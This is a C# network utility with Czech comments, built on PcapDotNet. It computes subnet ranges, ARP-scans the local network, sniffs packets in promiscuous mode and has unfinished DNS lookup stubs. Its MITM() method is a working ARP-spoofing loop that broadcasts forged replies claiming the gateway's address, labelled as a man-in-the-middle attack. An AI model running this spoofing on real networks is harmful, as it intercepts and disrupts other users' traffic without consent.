using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.NetworkInformation;
using System.Net;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Transport;

namespace Network
{
    public class Network
    {
        public IPAddress Address { get; private set; }
        public IPAddress DefaultGw { get; private set; }
        public IPAddress NetMask { get; private set; }
        public IPAddress BroadCast { get; private set; }
        public IPAddress NetworkAddr { get; private set; }
        public PhysicalAddress PhysicalAddr { get; private set; }
        public string PhysicalAddrString { get; private set; }
        public LivePacketDevice Device { get; private set; }
        public readonly List<Device> Devices = new List<Device>();
        private List<IPAddress> PosibleAddresesList; // pomocná proměná pro všechny možné adresy

        public Network()
        {
            var tmp = NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(x => x.OperationalStatus == OperationalStatus.Up).GetIPProperties();
            PhysicalAddr = NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(x => x.OperationalStatus == OperationalStatus.Up).GetPhysicalAddress();
            PhysicalAddrString = Split(PhysicalAddr.ToString());
            DefaultGw = tmp.GatewayAddresses[0].Address;
            Address = tmp.UnicastAddresses[1].Address;
            NetMask = tmp.UnicastAddresses[1].IPv4Mask;
            BroadCast = GetBroadCast();
            NetworkAddr = GetNetwork();
            Device = LivePacketDevice.AllLocalMachine.FirstOrDefault(x => x.Addresses[1].Address.ToString().Contains(Address.ToString()));
        }

        // upraví hwAddresu na normálně naformátovaný string
        private string Split(string hdwAddr)
        {
            string result = "";
            for (int i = 0; i < hdwAddr.Length - 1; i += 2)
            {
                result += hdwAddr.Substring(i, 2) + ":";
            }
            return result.Substring(0, result.Length - 1);
        }

        // vrátí broadcast pomocí adresy a masky
        private IPAddress GetBroadCast()
        {
            var addrBytes = Address.GetAddressBytes();
            var maskBytes = NetMask.GetAddressBytes();
            byte[] result = new byte[4];
            for (int i = 0; i < addrBytes.Length; i++)
            {
                string temp = "";
                int tempByte = 0;
                int addrByte = addrBytes[i];
                int maskByte = maskBytes[i];
                for (int x = 0; x < 8; x++)
                {
                    temp = (maskByte % 2 == 1 ? (addrByte % 2).ToString() : "1") + temp;
                    addrByte = addrByte >> 1;
                    maskByte = maskByte >> 1;
                }
                foreach (var let in temp)
                {
                    tempByte = tempByte << 1;
                    if (let == '1')
                        tempByte = tempByte |= 1;
                }
                result[i] = (byte)tempByte;
            }
            return new IPAddress(result);
        }

        // vrátí adresu sítě pomocí adresy a masky
        private IPAddress GetNetwork()
        {
            var addrBytes = Address.GetAddressBytes();
            var maskBytes = NetMask.GetAddressBytes();
            byte[] result = new byte[4];
            for (int i = 0; i < addrBytes.Length; i++)
            {
                string temp = "";
                int tempByte = 0;
                int addrByte = addrBytes[i];
                int maskByte = maskBytes[i];
                for (int x = 0; x < 8; x++)
                {
                    temp = (addrByte % 2 * maskByte % 2).ToString() + temp;
                    addrByte = addrByte >> 1;
                    maskByte = maskByte >> 1;
                }
                foreach (var let in temp)
                {
                    tempByte = tempByte << 1;
                    if (let == '1')
                        tempByte = tempByte |= 1;
                }
                result[i] = (byte)tempByte;
            }
            return new IPAddress(result);
        }

        public override string ToString()
        {
            return string.Format($"Address : {Address}\nDefault gateway : {DefaultGw}\nNetwork address : {NetworkAddr}\nBroadCast : {BroadCast}\nPhysical address : {PhysicalAddrString}");
        }

        // vrátí všechny možné adresy pomocí netmask a broadcastu
        public IPAddress[] PosibleAddresses()
        {
            if (PosibleAddresesList != null)
                return PosibleAddresesList.ToArray();
            PosibleAddresesList = new List<IPAddress>();
            byte[] broadcast = BroadCast.GetAddressBytes();
            byte[] network = NetworkAddr.GetAddressBytes();
            for (int oct1 = network[0]; oct1 <= broadcast[0]; oct1++)
            {
                for (int oct2 = network[1]; oct2 <= broadcast[1]; oct2++)
                {
                    for (int oct3 = network[2]; oct3 <= broadcast[2]; oct3++)
                    {
                        for (int oct4 = network[3]; oct4 <= broadcast[3]; oct4++)
                        {
                            PosibleAddresesList.Add(new IPAddress(new byte[] { (byte)oct1, (byte)oct2, (byte)oct3, (byte)oct4 }));
                        }
                    }
                }
            }
            PosibleAddresesList.RemoveAt(0);
            PosibleAddresesList.RemoveAt(PosibleAddresesList.Count - 1);
            return PosibleAddresses();
        }

        // vrátí všechny možné adresy mezi adresou start a end
        public IPAddress[] PosibleAddresses(IPAddress start, IPAddress end)
        {
            List<IPAddress> tmp = new List<IPAddress>();
            byte[] startByte = start.GetAddressBytes();
            byte[] endByte = end.GetAddressBytes();
            foreach (var i in PosibleAddresses())
            {
                byte[] addr = i.GetAddressBytes();
                if (Between(startByte, addr, endByte))
                    tmp.Add(i);
            }
            return tmp.ToArray();
        }

        // zjistí jestli je adresa mezi dvěma dalšími
        private bool Between(byte[] start, byte[] addr, byte[] end)
        {
            for (int i = 0; i < start.Length; i++)
            {
                if (!(start[i] <= addr[i] && addr[i] <= end[i]))
                    return false;
            }
            return true;
        }

        // proscanování sítě pomocí arp
        public Device[] Scan(IPAddress start, IPAddress end, int tries)
        {
            List<Device> devices = new List<Device>();
            bool tmp = true;
            // zaznamenávání příchozích packetů
            new Thread(new ThreadStart(delegate ()
            {
                using(PacketCommunicator pc = Device.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000))
                {
                    while (tmp)
                    {
                        var result = pc.ReceivePacket(out Packet p);
                        if (result == PacketCommunicatorReceiveResult.Ok)
                        {
                            if (p.Ethernet.EtherType == EthernetType.Arp && p.Ethernet.Arp.Operation == ArpOperation.Reply)
                            {
                                var temp = new Device(p.Ethernet.Arp.SenderProtocolAddress.ToArray(), p.Ethernet.Arp.SenderHardwareAddress.ToArray(), null);
                                //Console.WriteLine(temp.ToString());
                                if (!devices.Any(x => x.Compare(temp)))
                                {
                                    devices.Add(temp);
                                }
                            }
                        }
                    }
                }
            })).Start();
            // vysílání arp packetů
            using (PacketCommunicator pc = Device.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                for (int i = 0; i < tries; i++)
                {
                    foreach (var addr in PosibleAddresses(start, end))
                    {
                        Packet p = PacketBuilder.Build
                            (
                                DateTime.Now,
                                new EthernetLayer
                                {
                                    EtherType = EthernetType.None,
                                    Destination = new MacAddress("ff:ff:ff:ff:ff:ff"),
                                    Source = new MacAddress(PhysicalAddrString)
                                },
                                new ArpLayer
                                {
                                    Operation = ArpOperation.Request,
                                    ProtocolType = EthernetType.IpV4,
                                    SenderHardwareAddress = Array.AsReadOnly(PhysicalAddr.GetAddressBytes()),
                                    SenderProtocolAddress = Array.AsReadOnly(Address.GetAddressBytes()),
                                    TargetHardwareAddress = Array.AsReadOnly(new byte[] { 255,255,255,255,255,255}),
                                    TargetProtocolAddress = Array.AsReadOnly(addr.GetAddressBytes())
                                }
                            );
                        pc.SendPacket(p);
//#if DEBUG
//                        Console.WriteLine(addr.ToString());
//#endif
                    }
                }
                tmp = false;
            }
            return devices.ToArray();
        }

        // proscanování sítě pomocí arp
        public Device[] Scan(int tries)
        {
            return Scan(PosibleAddresses()[0], PosibleAddresses().Last(x=>x is IPAddress), tries);
        }

        // TODO: pomalé sledování sítě jen pomocí příchozích packetů
        public void SlowScan()
        {
            Task.Run(delegate ()
            {
                using (PacketCommunicator pc = Device.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000))
                {
                    while (true)
                    {
                        var result = pc.ReceivePacket(out Packet p);
                        if (result == PacketCommunicatorReceiveResult.Ok)
                        {
                            Console.WriteLine(UIntToIp(p.IpV4.Source.ToValue()));
                        }
                    }
                }
            });
        }

        // TODO: dodělat dotazi pro reverselookup
        public void GetDomainNames(ref Device[] devices, int tries)
        {
            new DnsLayer
            {
                IsQuery = true,
                IsResponse = false,
                DomainNameCompressionMode = DnsDomainNameCompressionMode.All,
                Queries = new DnsQueryResourceRecord[] {}
            };
        }

        // TODO: dodělat dotazi pro reverselookup
        public void GetDomainNames(int tries)
        {
            var tmp = Scan(tries);
            GetDomainNames(ref tmp, tries);
        }

        // útok man in the middle (TODO nějak zařídit routování packetů co přijdou)
        public void MITM()
        {
            // pokus o todo
            new Thread(new ThreadStart
                (
                    delegate ()
                    {
                        using(PacketCommunicator pc = Device.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000))
                        {
                            var result = pc.ReceivePacket(out Packet p);
                        }
                    }
                ));
            using (PacketCommunicator pc = Device.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                while (true)
                {
                    Packet p = PacketBuilder.Build
                        (
                            DateTime.Now,
                            new EthernetLayer
                            {
                                EtherType = EthernetType.None,
                                Destination = new MacAddress("ff:ff:ff:ff:ff:ff"),
                                Source = new MacAddress(PhysicalAddrString)
                            },
                            new ArpLayer
                            {
                                Operation = ArpOperation.Reply,
                                ProtocolType = EthernetType.IpV4,
                                SenderHardwareAddress = Array.AsReadOnly(PhysicalAddr.GetAddressBytes()),
                                SenderProtocolAddress = Array.AsReadOnly(DefaultGw.GetAddressBytes()),
                                TargetHardwareAddress = Array.AsReadOnly(new byte[] { 255, 255, 255, 255, 255, 255 }),
                                TargetProtocolAddress = Array.AsReadOnly(BroadCast.GetAddressBytes())
                            }
                        );
                    pc.SendPacket(p);
                    Thread.Sleep(5000);
                }
            }
        }

        // převod uint na ip (array bytů)
        private IPAddress UIntToIp (uint value)
        {
            byte[] temp = new byte[4];
            for(int i = 0; i < temp.Length; i++)
            {
                string tmp = "";
                int intTmp = 0;
                for(int j = 0; j < 8; j++)
                {
                    tmp = (value % 2).ToString() + tmp;
                    value = value >> 1;
                }
                foreach(var bit in tmp)
                {
                    intTmp = intTmp << 1;
                    if (bit == '1')
                        intTmp |= 1;
                }
                temp[3 - i] = (byte)intTmp;
            }
            return new IPAddress(temp);
        }
    }

    public class Device
    {
        public IPAddress IpAddr { get; private set; }
        public PhysicalAddress HardwareAddr { get; private set; }
        public string Name { get; set; }

        public Device(byte[] ipAddr, byte[] hwAddr, string name)
        {
            IpAddr = new IPAddress(ipAddr);
            HardwareAddr = new PhysicalAddress(hwAddr);
            Name = name;
        }

        public bool Compare(Device dev)
        {
            var ip1 = IpAddr.GetAddressBytes();
            var ip2 = dev.IpAddr.GetAddressBytes();
            for(int i = 0; i < 4; i++)
            {
                if (ip1[i] != ip2[i])
                    return false;
            }
            return true;
        }

        public override string ToString()
        {
            return string.Format($"{IpAddr.ToString()}\n{string.Join(":", HardwareAddr.GetAddressBytes())}\n{Name}");
        }
    }
}